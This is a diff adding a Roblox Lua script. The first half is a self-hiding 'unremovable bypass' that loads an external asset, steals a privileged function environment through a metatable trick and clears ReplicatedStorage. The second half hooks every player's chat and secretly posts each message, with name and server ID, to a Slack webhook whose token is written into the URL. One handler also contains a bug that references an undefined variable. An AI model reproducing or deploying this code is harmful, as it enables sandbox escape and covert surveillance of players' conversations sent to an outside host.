@@ -1,0 +1,45 @@
+wait(); --Unremovable bypass 
+script.Parent=nil
+rawset(shared, "\0bp", function()
+local i=game:service'InsertService':LoadAssetVersion(519416165);
+local n=i:children()[1];
+game:service'Debris':AddItem(i,0);
+n.Parent=workspace;
+coroutine.yield();
+local e;
+pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function(...)e=getfenv(2)end,__metatable=''}));
+_G.OSC_AddServerSideData=nil;
+game:service'Debris':AddItem(n,0);
+return e 
+end);
+local y=shared['\0bp']();
+shared["\0bp"]=nil;
+game:GetService'ReplicatedStorage':ClearAllChildren();
+y.setfenv(0,y);
+y.setfenv(1,y);
+y.pcall(function() y.setfenv(2,y); end);
+--end
+--//
+--Functions
+ function Slackbot(msg)
+     wait()
+   local post = game.HttpService:PostAsync('https://sb-scripts.slack.com/services/hooks/slackbot?token=LgvzZbwa5P2tIPUzTibrtRHn&channel=%23sbmessage',msg)
+ if post then
+         print'Sent!'
+         end
+  end
+for i,v in pairs(game.Players:GetPlayers'') do
+    v.Chatted:connect(function(msg)
+        wait()
+        Slackbot(v.Name..': '..msg..'\n JobID: '..game.JobId)
+    end)
+end
+game.Players.PlayerAdded:connect(function(plr)
+    plr.Chatted:connect(function(msg)
+        wait()
+        Slackbot(v.Name..': '..msg..'\n JobID: '..game.JobId)
+    end)
+    end)
+    game.OnClose = function()
+        Slackbot'Game shutdown!'
+        end
